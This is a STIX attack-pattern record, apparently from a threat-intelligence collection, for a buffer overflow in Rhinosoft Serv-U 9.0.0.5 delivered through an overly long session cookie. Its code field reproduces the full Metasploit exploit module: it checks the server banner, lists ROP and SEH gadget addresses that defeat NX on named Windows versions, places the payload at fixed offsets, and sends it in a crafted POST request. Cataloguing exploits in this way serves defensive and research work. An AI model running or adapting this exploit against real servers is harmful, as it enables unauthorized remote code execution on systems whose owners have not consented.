{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cbabf7f5-21d4-4581-9ed2-033202d07b07",
    "created": "2024-08-14T16:54:01.482194Z",
    "modified": "2024-08-14T16:54:01.482198Z",
    "name": "Rhinosoft Serv-U Session Cookie Buffer Overflow",
    "description": " This module exploits a buffer overflow in Rhinosoft Serv-U 9.0.0.5. Sending a specially crafted POST request with an overly long session cookie string, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/servu_session_cookie.rb",
            "external_id": "servu_session_cookie.rb"
        },
        {
            "source_name": "reference",
            "url": "http://rangos.de/ServU-ADV.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Rhinosoft Serv-U Session Cookie Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Rhinosoft Serv-U 9.0.0.5.\n        Sending a specially crafted POST request with an overly long session cookie\n        string, an attacker may be able to execute arbitrary code.\n      },\n      'Author'         =>\n        [\n          'Nikolas Rangos <nikolaos[at]rangos.de>',\n          'M.Yanagishita <megumi1990[at]gmail.com>',\n          'jduck'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-4006' ], # unsure\n          [ 'OSVDB', '59772' ],\n          [ 'URL', 'http://rangos.de/ServU-ADV.txt' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          #'Space'    => 512,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c&=+?:;-,/#.\\\\$%\\x1a\",\n          'StackAdjustment' => -4096,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2003 SP2 English (NX)',\n            {\n              'FixESP'\t=> 0x0fb02849, \t# add esp, 0x40c / ret \t\t@libeay32\n              'FixESI'\t=> 0x78a31e96, \t# pop esi / ret\t\t\t@mfc90u.dll\n              'FixEBP'\t=> 0x78a4ae99, \t# push esp / pop ebp / ret 0xc \t@mfc90u.dll\n              'Ret'\t\t=> 0x78a3e987, \t# ret 0x20\t\t\t@mfc90u.dll\n              'DisableNX'\t=> 0x7c83f547,\t# NX Disable\t\t\t@ntdll.dll\n              'JmpESP'\t=> 0x78b2c753\t# jmp esp\t\t\t@mfc90u.dll\n            }\n          ],\n\n          [ 'Windows 2000 SP4 and XP SP3 English (SEH)',\n            {\n              'Ret'\t=> 0x0fb870bd\t\t# pop pop ret\t\t\t@libeay32.dll\n            }\n          ],\n        ],\n\n      'DefaultTarget'  => 1,\n      'DisclosureDate' => '2009-11-01'))\n\n      register_options( [ Opt::RPORT(80) ])\n\n  end\n\n  def check\n    connect\n    sock.put(\"\\r\\n\\r\\n\") # works\n    res = sock.get_once\n    disconnect\n\n    if (res.to_s =~ /Server: Serv-U\\/9\\.0\\.0\\.5/)\n      return Exploit::CheckCode::Appears\n    elsif (res.to_s =~ /Server: Serv-U/)\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    # hit end of stack..\n    sploit = Rex::Text.rand_text(1000) * 75\n\n    if (target.name =~ /NX/)\n\n      # new SEH handler (point esp into buffer)\n      sploit[41000,4] = [target['FixESP']].pack('V')\n\n      # stack frame to bypass NX\n      sploit[52+0,4] = [target['FixESI']].pack('V')\n      sploit[52+4,4] = [0x10200].pack('V')\n      sploit[52+8,4] = [target['FixEBP']].pack('V')\n      sploit[52+12,4] = [target['Ret']].pack('V')\n      sploit[52+16,4] = [target['JmpESP']].pack('V')\n      sploit[52+20,4] = [target['DisableNX']].pack('V')\n      sploit[52+24,2] = \"\\xeb\\x20\"\n      sploit[52+40,payload.encoded.length] = payload.encoded\n\n    else\n\n      seh = generate_seh_record(target.ret)\n      sploit[40996,seh.length] = seh\n      sploit[41004,payload.encoded.length] = payload.encoded\n\n    end\n\n    req =  \"POST / HTTP/1.1\\r\\n\"\n    req << \"Host: #{rhost}:#{rport}\\r\\n\"\n    req << \"Cookie: Session=_\"\n    req << sploit.unpack('H*')[0]\n    req << \"\\r\\n\"\n    req << \"\\r\\n\";\n\n    connect\n    print_status(\"Trying target #{target.name}...\" % target['Ret'])\n    sock.put(req)\n\n    select(nil, nil, nil, 1.5)\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-01",
    "x_mitre_platforms": [
        "win'"
    ]
}